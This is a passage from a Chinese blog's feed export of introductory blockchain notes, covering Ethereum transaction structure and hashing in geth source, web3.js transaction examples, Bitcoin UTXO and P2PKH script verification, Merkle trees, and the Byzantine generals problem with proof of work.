class="code"><pre><span class="line"><span class="keyword">type</span> txdata <span class="keyword">struct</span> &#123;</span><br><span class="line">AccountNonce <span class="keyword">uint64</span>          <span class="string">`json:"nonce"    gencodec:"required"`</span></span><br><span class="line">Price        *big.Int        <span class="string">`json:"gasPrice" gencodec:"required"`</span></span><br><span class="line">GasLimit     <span class="keyword">uint64</span>          <span class="string">`json:"gas"      gencodec:"required"`</span></span><br><span class="line">Recipient    *common.Address <span class="string">`json:"to"       rlp:"nil"`</span> <span class="comment">// nil means contract creation</span></span><br><span class="line">Amount       *big.Int        <span class="string">`json:"value"    gencodec:"required"`</span></span><br><span class="line">Payload      []<span class="keyword">byte</span>          <span class="string">`json:"input"    gencodec:"required"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Signature values</span></span><br><span class="line">V *big.Int <span class="string">`json:"v" gencodec:"required"`</span></span><br><span class="line">R *big.Int <span class="string">`json:"r" gencodec:"required"`</span></span><br><span class="line">S *big.Int <span class="string">`json:"s" gencodec:"required"`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This is only used when marshaling to JSON.</span></span><br><span class="line">Hash *common.Hash <span class="string">`json:"hash" rlp:"-"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先解释一下注释中的内容来源。以太坊会向外部提供JSON RPC服务，供外部调用，RPC服务通过json格式传输数据，节点接收到json数据后会转换成内部的数据结构来使用。两种数据结构转换的方法是利用json的序列化（<code>MarshalJSON</code>）和反序列化（<code>UnmarshalJSON</code>）来完成的。而注释的内容就是内部结构体与json数据各字段的对应关系。</p><p>为什么要使用json来进行通讯呢？因为web3.js中的<code>eth.getTransaction()</code>和<code>eth.sendTransaction()</code>使用的数据就是json格式的。</p><p>接下来解释一下各字段的意思，其实大部分我们都能看懂：</p><ul><li><code>AccountNonce</code>：此交易的发送者已发送过的交易数。</li><li><code>Price</code>：此交易的gas price</li><li><code>GasLimit</code>：本交易允许消耗的最大gas数量</li><li><code>Recipient</code>：交易的接收者，是一个地址</li><li><code>Amount</code>：交易转移的以太币数量，单位是wei</li><li><code>Payload</code>：交易可以携带的数据，在不同类型的交易中有不同的含义</li><li><code>V R S</code>：交易的签名数据</li></ul><p>这里出现了一个gas新名词，其实gas就相当于运行合约的手续费。gas的数量是由合约的复杂性来确定的，当然gas也是矿工在运行时所收取的“工资”。gas主要是用来先知执行交易所需要的工作量，无论运行到什么时候，只要gas被耗尽，就会触发异常，所有的状态修改帧都会回滚，这样就防止有人写出无法停止的合约来阻塞网络。</p><p>这里并没有一个字段来指明交易的发送者，因为交易的发送者地址可以从签名中得到。</p><p>Payload这个字段在<code>eth.sendTransaction()</code>中对应的是data字段，在<code>eth.getTransaction()</code>中对应的是input字段。</p><h2 id="2-交易的哈希计算"><a href="#2-交易的哈希计算" class="headerlink" title="2. 交易的哈希计算"></a>2. 交易的哈希计算</h2><p>下面是计算交易Hash的函数，它是先从缓存<code>tx.hash</code>中取，如果取到，就直接返回，如果缓存中没有，就调用<code>rlpHash</code>计算hash，然后把hash值加入到缓存中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hash hashes the RLP encoding of tx.</span></span><br><span class="line"><span class="comment">// It uniquely identifies the transaction.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx *Transaction)</span> <span class="title">Hash</span><span class="params">()</span> <span class="title">common</span>.<span class="title">Hash</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> hash := tx.hash.Load(); hash != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> hash.(common.Hash)</span><br><span class="line">&#125;</span><br><span class="line">v := rlpHash(tx)</span><br><span class="line">tx.hash.Store(v)</span><br><span class="line"><span class="keyword">return</span> v</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rlpHash</code>代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rlpHash</span><span class="params">(x <span class="keyword">interface</span>&#123;&#125;)</span> <span class="params">(h common.Hash)</span></span> &#123;</span><br><span class="line">hw := sha3.NewKeccak256()</span><br><span class="line">rlp.Encode(hw, x)</span><br><span class="line">hw.Sum(h[:<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> h</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>rlpHash</code>函数可以看出，计算hash的方法是先对交易进行<a href="https://my.oschina.net/u/2349981/blog/894117" target="_blank" rel="noopener">RLP编码</a>，然后计算RLP编码数据的hash，具体的hash算法是<code>Keccak256</code>。</p><p>而进行哈希计算的字段在<code>rlp.Encode</code>的注释中有所提及：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If the type implements the Encoder interface, Encode calls</span></span><br><span class="line"><span class="comment">// EncodeRLP. This is true even for nil pointers, please see the</span></span><br><span class="line"><span class="comment">// documentation for Encoder.</span></span><br></pre></td></tr></table></figure><p>如果一个类型实现了<code>Encoder</code>接口，那么<code>Encode</code>函数就会调用那个类型所实现的<code>EncodeRLP</code>函数。所以我们就要看<code>Transaction</code>这个结构体是否实现了<code>EncodeRLP</code>函数。回到<code>core/types/transaction.go</code>中，可以看到<code>Transaction</code>确实实现了<code>EncodeRLP</code>函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DecodeRLP implements rlp.Encoder</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tx *Transaction)</span> <span class="title">EncodeRLP</span><span class="params">(w io.Writer)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> rlp.Encode(w, &amp;tx.data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这可以看出交易的hash实际上是对<code>tx.data</code>进行hash计算得到的：<code>txhash=Keccak256(rlpEncode(tx.data))</code>。</p><h1 id="0x03-交易的类型"><a href="#0x03-交易的类型" class="headerlink" title="0x03 交易的类型"></a>0x03 交易的类型</h1><p>在源码中交易只有一种数据结构，就是在web3.js中定义的发送交易的接口，而根据接口的三种不同使用方法，可以大致将交易分为三种：转账交易、创建合约交易、执行合约交易。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(transactionObject [, callback])</span><br></pre></td></tr></table></figure><h2 id="1-转账交易"><a href="#1-转账交易" class="headerlink" title="1. 转账交易"></a>1. 转账交易</h2><p>转账是最简单的一种交易，这里转账是指从一个账户向另一个账户发送以太币。发送转账交易的时候只需要指定交易的发送者、接收者、转币的数量。使用web3.js发送转账交易应该像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: &quot;0xb60e8dd61c5d32be8058bb8eb970870f07233155&quot;,</span><br><span class="line">    to: &quot;0xd46e8dd67c5d32be8058bb8eb970870f07244567&quot;,</span><br><span class="line">    value: 10000000000000000</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>value是转移的以太币数量，单位是<code>wei</code>，对应的是源码中的<code>Amount</code>字段。<code>to</code>对应的是源码中的<code>Recipient</code>。</p><h2 id="2-创建合约的交易"><a href="#2-创建合约的交易" class="headerlink" title="2. 创建合约的交易"></a>2. 创建合约的交易</h2><p>创建合约指的是将合约部署到区块链上，这也是通过发送交易来实现。在创建合约的交易中，<code>to</code>字段要留空不填，在<code>data</code>字段中指定合约的二进制代码，<code>from</code>字段是交易的发送者也是合约的创建者。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: &quot;contract creator&apos;s address&quot;,</span><br><span class="line">    data: &quot;contract binary code&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>data</code>字段对应的是源码中的<code>Payload</code>字段。</p><h2 id="3-执行合约的交易"><a href="#3-执行合约的交易" class="headerlink" title="3. 执行合约的交易"></a>3. 执行合约的交易</h2><p>调用合约中的方法，需要将交易的<code>to</code>字段指定为要调用的合约的地址，通过<code>data</code>字段指定要调用的方法以及向该方法传递的参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: &quot;sender&apos;s address&quot;,</span><br><span class="line">    to: &quot;contract address&quot;,</span><br><span class="line">    data: &quot;hash of the invoked method signature and encoded parameters&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>data</code>字段需要特殊的编码规则，具体细节可以参考<a href="https://github.com/ethereum/wiki/wiki/Ethereum-Contract-ABI" target="_blank" rel="noopener">Ethereum Contract ABI</a>。自己拼接字段既不方便又容易出错，所以一般都使用封装好的SDK（比如web3.js）来调用合约。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;以太坊的目的是基于脚本、竞争币和链上元协议（on-chain meta-protocol）概念进行整合和提高，使得开发者能够创建任意的基于共识的、可扩展的、标准化的、特性完备的、易于开发的和协同的应用。以太坊通过建立终极的抽象的基础层-内置有图灵完备编程语言的区块链-使得任何人都能够创建合约和去中心化应用并在其中设立他们自由定义的所有权规则、交易方式和状态转换函数。域名币的主体框架只需要两行代码就可以实现，诸如货币和信誉系统等其它协议只需要不到二十行代码就可以实现。智能合约-包含价值而且只有满足某些条件才能打开的加密箱子-也能在我们的平台上创建，并且因为图灵完备性、价值知晓（value-awareness）、区块链知晓（blockchain-awareness）和多状态所增加的力量而比比特币脚本所能提供的智能合约强大得多。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面是以太坊白皮书上对以太坊的介绍，其实简单来说，以太坊就是一个框架，利用这个框架开发出的应用叫智能合约。&lt;/p&gt;
    
    </summary>
    
      <category term="blockchain" scheme="https://lucifaer.com/categories/blockchain/"/>
    
    
      <category term="blockchain" scheme="https://lucifaer.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>比特币简介</title>
    <link href="https://lucifaer.com/2018/06/18/%E6%AF%94%E7%89%B9%E5%B8%81%E7%AE%80%E4%BB%8B/"/>
    <id>https://lucifaer.com/2018/06/18/比特币简介/</id>
    <published>2018-06-18T10:57:44.000Z</published>
    <updated>2018-11-29T09:28:45.574Z</updated>
    
    <content type="html"><![CDATA[<p>本篇重点不放在科普比特币上，重点放在比特币交易的整个生命周期上。</p><p>比特币是基于分布式网络的数字货币，当然也可以说是基于区块链网络的数字货币。比特币的核心是基于<strong>非对称加密</strong>来的，<strong>非对称加密保证了支付的可靠性</strong>。而比特币钱包其实就是你的<strong>公私钥对</strong>，交易时你只需要把钱包地址交给别人即可，别人用你的公钥加密比特币，发送到你的地址就完成了交易，而你的钱包地址是由你自己的私钥证明的，所以你丢了私钥，就丢掉了你的钱包。</p><a id="more"></a><h1 id="0x00-简述比特币的交易过程"><a href="#0x00-简述比特币的交易过程" class="headerlink" title="0x00 简述比特币的交易过程"></a>0x00 简述比特币的交易过程</h1><p>首先在交易发起时，转出比特币的一方提供以下数据：</p><ul><li>上一笔交易的 Hash（你从哪里得到这些比特币）</li><li>本次交易双方的地址</li><li>支付方的公钥</li><li>支付方的私钥生成的数字签名</li></ul><p>验证这笔交易是否属实，只要经过三步检查即可：</p><ul><li>第一步，找到上一笔交易，确认支付方的比特币来源。</li><li>第二步，算出支付方公钥的指纹，确认与支付方的地址一致，从而保证公钥属实。</li><li>第三步，使用公钥去解开数字签名，保证私钥属实。</li></ul><p>确认交易真实性后，将交易数据传送给矿工，矿工将交易数据写入区块链中，就完成了交易。</p><h1 id="0x01-比特币交易细节"><a href="#0x01-比特币交易细节" class="headerlink" title="0x01 比特币交易细节"></a>0x01 比特币交易细节</h1><p>从上面的交易流程中我们可以看到比特币账本可以被认为是一个状态转换系统，这个系统中包含所有现存比特币的所有权状态和“状态转换函数”。状态转换函数以当前状态和交易为输入，输出新的状态。但是这个状态和一般的状态还有所不同，<strong>比特币系统的状态是所有已经被挖出的、没有花费的比特币集合</strong>。要理解这个概念，就不得不说UTXO。</p><hr><h2 id="未花费的交易输出——UTXO"><a href="#未花费的交易输出——UTXO" class="headerlink" title="未花费的交易输出——UTXO"></a>未花费的交易输出——UTXO</h2><p>如前文所说，比特币的交易都是基于UTXO的，即交易的输入是之前交易为花费的输出，这笔交易的输出可以被当做下一笔交易的输入。为什么要引入这样的关系呢？因为比特币是基于去中心化的应用，而去中心化的特征致使比特币没有余额的概念，只能将交易账单分散到区块链中的UTXO。UTXO是交易的基本单元，不能分割。</p><p>下面用一张盗来的图来说明比特币从一个地址被移动到另一个地址所形成的一条所有链：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15292892091142.jpg" alt=""></p><hr><p>了解了UTXO后，我们可以发现每个UTXO都有一个面值和所有者。在交易过程中一个交易包括一个或多个输入和一个或多个输出。每个输入包含一个对现有UTXO的引用和由与所有者地址相对应的私钥创建的密码学签名。每个输出包含一个新的加入到状态中的UTXO。</p><p>那么验证一笔交易的具体流程是什么呢？这需要引入介绍比特币交易的两个脚本：</p><hr><h2 id="验证一笔交易——P2PKH——比特币交易脚本"><a href="#验证一笔交易——P2PKH——比特币交易脚本" class="headerlink" title="验证一笔交易——P2PKH——比特币交易脚本"></a>验证一笔交易——P2PKH——比特币交易脚本</h2><p>P2PKH全名是（Pay-to-Public-Key-Hash）主要是用于完成比特币交易的一个常见的脚本，其主要由两个脚本构成：</p><ul><li>Signature script——解锁UTXO脚本，用于解锁UTXO，同时在交易流程中也称作交易输入。</li><li>PubKey script——锁定脚本，这个脚本是交易输出所指向的一个迪奥本，主要用于验证谁的签名能匹配交易输出地址，比特币就转给谁</li></ul><p>每一个比特币节点会同时执行解锁和锁定脚本（锁定脚本是上一个交易的锁定脚本，这样可以确认输入的来源，即上一笔交易输出作为下一笔交易的输入）来验证一笔交易，如果脚本组合结果为真，则交易有效。</p><blockquote><p>当解锁脚本与锁定脚本的设定条件相匹配时，执行组合有效脚本时才会显示结果为真。</p></blockquote><p>P2PKH模型如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15292909162189.jpg" alt=""></p><p>这里我们需要记住这几个指令，在交易验证过程中会提及。</p><hr><p>交易脚本验证的过程其实就是基于栈的执行语言，我在学习是看到一个讲的非常清楚的调用栈的图，这边就引用过来了：</p><p>首先是解锁脚本的运行过程，也就是入栈的过程：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15292910897406.jpg" alt=""></p><p>锁定脚本的运行过程，也就是出栈的过程：；</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15292911586251.jpg" alt=""></p><p>如果最后结果为真，说明交易有效。</p><h1 id="0x02-区块链如何解决数据量过大的问题"><a href="#0x02-区块链如何解决数据量过大的问题" class="headerlink" title="0x02 区块链如何解决数据量过大的问题"></a>0x02 区块链如何解决数据量过大的问题</h1><p>我们来思考这样一个问题：</p><p>比如A用户在某一时间与B用户产生了比特币的交易，交易记录会被矿工所接受并存储在当时对应的区块中。但是之后很长一段时间，假如未来的1年内，B都没有再次进行交易，那么B如何得知自己的钱包中还有多少比特币呢？</p><p>我们知道在区块链系统中，尤其是在使用UTXO方式存储交易的区块链系统中，每一个区块保存的都是交易的过程。如果一个账户一直没有交易，它则不会出现在最新的区块中。所以就造成了如上的问题——当前区块没有B一年前的交易信息，那么B如何能得知自己的比特币钱包中的比特币数量呢？</p><p>如果按照传统数据库删除历史数据的方式，只要一个区块中有一个交易一直没有后续交易（即没有人使用这个交易的输出账户），为了维护整个区块链系统的密码学完整性和安全性，这个区块就必须被保留，同时这个区块之后的所有区块也必须被保留。这样数据会不停的增长，当数据量过大时，处理数据就会非常的慢。所以这个问题最后就是<strong>区块链如何解决数据量过大的问题</strong>。</p><p>区块链解决这个问题的方法，就是<strong>默克尔树算法（Merkle）</strong>。</p><p>接下来我盗图来说明：</p><p>在区块链系统中，区块的结构如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15293049687731.jpg" alt=""></p><p>区块体包括当前区块经过验证的、 区块创建过程中生成的所有交易记录。这些记录通过Merkle树的哈希过程生成唯一的Merkle根并记入区块头。</p><p>默克尔树是一种二叉树，由一组叶节点、一组中间节点和一个根节点构成。最下面的大量的叶节点包含基础数据，每个中间节点是它的两个子节点的哈希，根节点也是由它的两个子节点的哈希，代表了默克尔树的顶部。默克尔树的目的是允许区块的数据可以零散地传送：节点可以从一个源下载区块头，从另外的源下载与其有关的树的其它部分，而依然能够确认所有的数据都是正确的。之所以如此是因为哈希向上的扩散：如果一个恶意用户尝试在树的下部加入一个伪造的交易，所引起的改动将导致树的上层节点的改动，以及更上层节点的改动，最终导致根节点的改动以及区块哈希的改动，这样协议就会将其记录为一个完全不同的区块（几乎可以肯定是带着不正确的工作量证明的）。</p><p>默克尔树算法并不是直接计算整个字符串的哈希值，而是每个交易都计算一个哈希值，然后两两连接再次计算哈希值，一直到最顶层的Merkle根。</p><p>也就是默克尔树完成了将一个区块转换为一串哈希值的过程。这样每个交易的区块都可以单独删除，只需要保留交易的哈希值就行。</p><p>通过这样的方法就可以完美的解决数据量过大的问题。</p><h1 id="0x03-区块链如何多点进行哈希验证？"><a href="#0x03-区块链如何多点进行哈希验证？" class="headerlink" title="0x03 区块链如何多点进行哈希验证？"></a>0x03 区块链如何多点进行哈希验证？</h1><p>现在复杂度提高一点，在P2P网络中下载时，会把大文件切成小文件，同时从多个机器上下载数据，这个时候怎么验证数据呢？</p><p>以BT下载为例，在下载真正的数据之前，我们会先下载一个哈希列表的（每个下小块计算出一个哈希），如果有一个小块数据在传输过程中损坏了，那我只要重新下载这一个数据块就行了，这时有一个问题就出现了，那么多的哈希，怎么保证它们本身(哈希列表中的哈希值)都是正确地呢？</p><p>答案是把每个小块数据的哈希值拼到一起，然后对这个长字符串在作一次哈希运算，得到哈希列表的根哈希。只要根哈希校对比一样就说明验哈希列表是正确的，再通过哈希列表校验小数据块，如果所有的小数据块验证通过则说明大文件没有被损坏。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇重点不放在科普比特币上，重点放在比特币交易的整个生命周期上。&lt;/p&gt;
&lt;p&gt;比特币是基于分布式网络的数字货币，当然也可以说是基于区块链网络的数字货币。比特币的核心是基于&lt;strong&gt;非对称加密&lt;/strong&gt;来的，&lt;strong&gt;非对称加密保证了支付的可靠性&lt;/strong&gt;。而比特币钱包其实就是你的&lt;strong&gt;公私钥对&lt;/strong&gt;，交易时你只需要把钱包地址交给别人即可，别人用你的公钥加密比特币，发送到你的地址就完成了交易，而你的钱包地址是由你自己的私钥证明的，所以你丢了私钥，就丢掉了你的钱包。&lt;/p&gt;
    
    </summary>
    
      <category term="blockchain" scheme="https://lucifaer.com/categories/blockchain/"/>
    
    
      <category term="blockchain" scheme="https://lucifaer.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>区块链补充</title>
    <link href="https://lucifaer.com/2018/06/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E8%A1%A5%E5%85%85/"/>
    <id>https://lucifaer.com/2018/06/18/区块链补充/</id>
    <published>2018-06-18T09:03:44.000Z</published>
    <updated>2018-11-29T09:29:27.036Z</updated>
    
    <content type="html"><![CDATA[<h1 id="区块链补充"><a href="#区块链补充" class="headerlink" title="区块链补充"></a>区块链补充</h1><p>在完成区块链基础的笔记后，我认真地读了一遍以太坊白皮书，感觉有很多问题是之前那篇文章没有说清楚的，需要自己再好好的补充学习一下，这篇笔记就是对之前笔记的补充。</p><a id="more"></a><h1 id="0x00-去中心化需要面对的核心问题——拜占庭将军问题"><a href="#0x00-去中心化需要面对的核心问题——拜占庭将军问题" class="headerlink" title="0x00 去中心化需要面对的核心问题——拜占庭将军问题"></a>0x00 去中心化需要面对的核心问题——拜占庭将军问题</h1><h2 id="1-拜占庭将军问题"><a href="#1-拜占庭将军问题" class="headerlink" title="1. 拜占庭将军问题"></a>1. 拜占庭将军问题</h2><p>在了解了一些区块链基础后，经常会看到某某区块链利用某某算法解决了拜占庭问题，所以理解拜占庭问题是了解为什么区块链是去中心化的关键。</p><p>拜占庭将军问题（拜占庭容错）是莱斯利·兰波特用来为描述<strong>分布式系统一致性问题</strong>在论文中抽象出来的一个著名的例子。</p><p>这个例子挺好玩的，我在他的描述上把数字量化了，方便理解：</p><blockquote><p>一组拜占庭将军分别各率领一支军队共同围困一座城市。为了简化问题，将各支军队的行动策略限定为进攻或撤离两种。因为部分军队进攻部分军队撤离可能会造成灾难性后果，因此各位将军必须通过投票来达成一致策略，即所有军队一起进攻或所有军队一起撤离。因为各位将军分处城市不同方向，他们只能通过信使互相联系。在投票过程中每位将军都将自己投票给进攻还是撤退的信息通过信使分别通知其他所有将军，这样一来每位将军根据自己的投票和其他所有将军送来的信息就可以知道共同的投票结果而决定行动策略。</p></blockquote><p>在这个问题中，我们不讨论信使无法传达信息的情况。我们现在来分析一下这个问题可能出现的情况：</p><p>假设有9位将军投票，其中1名叛徒。8名忠诚的将军中出现了4人进攻，4人撤退的情况。这个时候叛徒可能就故意的给4名投进攻的将领送信表示投票进攻，而给4名投撤离的将领送信表示投撤离，这样无论从进攻方还是从撤离方来看，他们都是占有人数多的优势的，这样就造成了这一组军队的协同性遭到破坏。</p><p>假设那些忠诚的将军们仍能通过多数决定来决定他们的战略，这样就叫做达成了拜占庭容错。</p><p>我们可以看到传统的加解密是无法解决这样的问题的，因为这个问题的关键不是信息泄露，而是存在一个信息来源是否可信的问题。</p><p>解决这个问题的最好方法就是利用无法消去的数字签名来进行认证。利用数字签名固然可以找到那些“叛徒”，但是相比于消耗资源更小的错误检测（日志审计系统）系统来说，有些小题大做，比较消耗资源。而错误检测系统也会因为其覆盖错误率不全的问题而出现拜占庭问题。</p><p>莱斯利·兰波特的解决方案是<code>Paxos</code>算法或其衍生算法，简单来说就是建立一个绝对可信任的中心，收集各个节点的消息，并将准确的消息再同步到各个节点上。而这样的做法是只适用于中心化的分布式系统的。并不适合区块链的去中心化思想。</p><p>中本聪利用了一种巧妙的方式，解决了去中心化的拜占庭将军问题。</p><h2 id="2-去中心化的解决方法——工作量证明算法（POW）"><a href="#2-去中心化的解决方法——工作量证明算法（POW）" class="headerlink" title="2. 去中心化的解决方法——工作量证明算法（POW）"></a>2. 去中心化的解决方法——工作量证明算法（POW）</h2><p>POW利用工作量证明增加了发送消息的成本，降低节点发送消息的频率，这样就可以保证在一个时间段内只有一个节点（或者很少的节点）在进行广播，同时在广播时附带自己的签名。</p><p>这样就相当于减少了在整个分布式网络中其他节点的噪声，只需要让其他节点选择接受或不接受即可，诚实的节点自然会选择接受。你也可以理解为能者为大。</p><p>以上就是区块链网络中单个区块达成共识的方法（取得一致性）。</p><p>同时也可以用这个例子来解释区块链的最长链选择问题：假设这座城市需要攻打多次，那么每次发出攻击提议的人员必须是之前取得最多次胜利的人提出，也就是做的工作最多的人来完成。</p><h2 id="3-总结一下"><a href="#3-总结一下" class="headerlink" title="3. 总结一下"></a>3. 总结一下</h2><p>中本聪将一个非常简单的基于节点的去中心化共识协议与工作量证明机制结合在一起。节点通过工作量证明机制获得参与到系统的权利，每十分钟将交易打包到“区块”中，从而创建出不断增长的区块链。拥有大量算力的节点有更大的影响力，但获得比整个网络更多的算力比创建一百万个节点困难得多。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;区块链补充&quot;&gt;&lt;a href=&quot;#区块链补充&quot; class=&quot;headerlink&quot; title=&quot;区块链补充&quot;&gt;&lt;/a&gt;区块链补充&lt;/h1&gt;&lt;p&gt;在完成区块链基础的笔记后，我认真地读了一遍以太坊白皮书，感觉有很多问题是之前那篇文章没有说清楚的，需要自己再好好的补充学习一下，这篇笔记就是对之前笔记的补充。&lt;/p&gt;
    
    </summary>
    
      <category term="blockchain" scheme="https://lucifaer.com/categories/blockchain/"/>
    
    
      <category term="blockchain" scheme="https://lucifaer.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>区块链基础概念</title>
    <link href="https://lucifaer.com/2018/06/18/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/"/>
    <id>https://lucifaer.com/2018/06/18/区块链基础概念/</id>
    <published>2018-06-18T08:56:44.000Z</published>
    <updated>2018-11-29T09:30:08.179Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-什么是区块链"><a href="#0x00-什么是区块链" class="headerlink" title="0x00 什么是区块链"></a>0x00 什么是区块链</h1><p>简单一句话就可以回答：<strong>区块链是一种特殊的分布式数据库</strong>。</p><a id="more"></a><p>想要理解上面的叙述，你需要理解下面两个概念：</p><ul><li>分布式系统</li><li>去中心化</li></ul><p>分布式系统我就不多说了，想必大家都清楚。那么我们重点来说一下去中心化。</p><blockquote><p>去中心化，简单来说，<strong>去中心化不是没有中心，而是在一个分布有众多节点的系统中，每个节点都可以成为一个中心，而且每个中心都不是永久的，都是阶段性的</strong>。</p></blockquote><p>这意味着在整个分布式系统中各个节点的地位都是平等的。而去中心化和区块链的关系可以这么理解：<strong>区块链是去中心化的一种实现工具或者说是实现方法</strong>。</p><p>首先，区块链的作用是用来储存分布式网络（区块链网络）中的信息。在区块链网络中任何需要存储的信息都可以写入区块链，同时在区块链网络中任一节点也可以从区块链中读取相应的信息，<strong>所以说它就是一个分布式数据库</strong>。</p><p>其次，任何人都可以加入这个区块链网络中，并成为其中的一个节点。在区块链网络中，没有中心节点，每一个节点都是平等的，都保存着完整的区款链（数据库）。也就是说在任一节点对区块链进行读写操作最后都会同步到整个区块链网络上。</p><h1 id="0x01-区块链特点"><a href="#0x01-区块链特点" class="headerlink" title="0x01 区块链特点"></a>0x01 区块链特点</h1><p>经过上面的介绍，可能会觉得区块链和分布式数据库没有什么差别。实际上区块链是改进了分布式数据库的一个新产品吧。</p><p>区块链最具特点的地方在：<strong>区块链作为一个分布式数据库，是没有管理员的，也就是去中心化的</strong>。去中心化的思路使区块链是无法被审计的，同时也不会受到某些处于中心位置的管理员对其进行管理。所以区块链是无法被控制的。</p><p>这样的特点其实也造成了一些云玩家天天叫喊着“我们为了隐私，要去中心化”的儿戏之言。就像你觉得FaceBook要求用户上传他们的隐私，以此来防止用户隐私泄露的方法很蠢一样，为了隐私而去中心化，其实和FaceBook的做法差不多。</p><h1 id="0x02-区块链的组成——区块"><a href="#0x02-区块链的组成——区块" class="headerlink" title="0x02 区块链的组成——区块"></a>0x02 区块链的组成——区块</h1><p>区块链由一个个区块组成。每一个区块也可以称为数据库的记录。区块的构造有点像内存的结构，包含两个部分：</p><ul><li>区块头（Head）：记录当前区块的特征值</li><li>区块体（Body）：实际数据</li></ul><p>区块头包含着当前区块的多项特征，下图是区块头的示意图：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15290758238724.jpg" alt=""></p><p>其中比较重要的几个特征为：</p><ul><li>hashPrevBlock（上一个区块的哈希）</li><li>Target（难度目标）：该区块工作量证明算法的难度目标，后面会提到</li><li>Nonce</li></ul><p>我们都知道如果原始内容不同，其对应的哈希一定是不同的，哈希保证了数据的唯一性。因此：</p><ul><li>可以通过哈希来表示不同的区块</li><li>如果区块的内容改变了，其哈希一定会改变</li></ul><p>也就是说：</p><blockquote><p>在区块链中，如果当前区块的内容改变了，或者上一个区块的哈希变了，一定会引起当前区块的哈希改变。</p></blockquote><p>这一点对于区块链来说意义重大。如果有人改变了一个区块的内容，这个区块的哈希就会改变。为了让后面的区块还能连接到它（Head中所记录的上一个区块的哈希值），他需要一次改变后面的所有区块，否则后面的区块就会脱离该区块链。而哈希破解本身就需要相当大的算力，所以短时间更改多个区块基本上是不可能发生的。</p><p>这样就保证了区块链中的每一个区块是很难被更改的。防止数据被篡改。</p><h1 id="0x03-区块的产生——挖矿"><a href="#0x03-区块的产生——挖矿" class="headerlink" title="0x03 区块的产生——挖矿"></a>0x03 